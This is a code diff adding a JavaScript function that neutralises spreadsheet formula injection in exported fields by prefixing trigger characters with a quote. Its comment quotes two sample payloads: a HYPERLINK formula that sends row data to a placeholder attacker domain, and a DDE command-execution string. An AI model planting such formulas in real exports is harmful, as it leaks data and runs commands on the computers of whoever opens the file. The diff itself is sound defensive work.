@@ -61,4 +61,39 @@ function getNestedValue(obj, key) {
   return key.split('.').reduce((o, k) => (o && o[k] !== undefined ? o[k] : undefined), obj);
 }
 
-module.exports = { resolveColumns, getNestedValue };
+/**
+ * Defang Excel/Sheets formula triggers in exported strings.
+ *
+ * A cell whose string value starts with `=`, `+`, `-`, `@`, tab, or
+ * CR is interpreted as a formula when the file is opened in Excel,
+ * Numbers, LibreOffice Calc, or Google Sheets. An admin who can
+ * influence ANY exported field (beneficiary name, payment notes,
+ * incident description, etc.) can plant `=HYPERLINK("https://evil/?
+ * x="&A1, "click")` to exfiltrate the row to an attacker domain, or
+ * the legacy `=cmd|'/C calc'!A0` DDE payload on un-patched Excel.
+ *
+ * OWASP-recommended defence: prefix any cell starting with one of
+ * those characters with a single quote `'`. Excel treats the leading
+ * quote as a literal-string marker and displays the rest as text.
+ *
+ * Numbers, dates, booleans, and null/undefined pass through unchanged.
+ * Strings that don't start with a trigger char pass through unchanged.
+ */
+function escapeFormulaInjection(value) {
+  if (typeof value !== 'string' || value.length === 0) return value;
+  const first = value.charCodeAt(0);
+  // 0x09 = TAB, 0x0D = CR, 0x2B = '+', 0x2D = '-', 0x3D = '=', 0x40 = '@'
+  if (
+    first === 0x09 ||
+    first === 0x0d ||
+    first === 0x2b ||
+    first === 0x2d ||
+    first === 0x3d ||
+    first === 0x40
+  ) {
+    return `'${value}`;
+  }
+  return value;
+}
+
+module.exports = { resolveColumns, getNestedValue, escapeFormulaInjection };
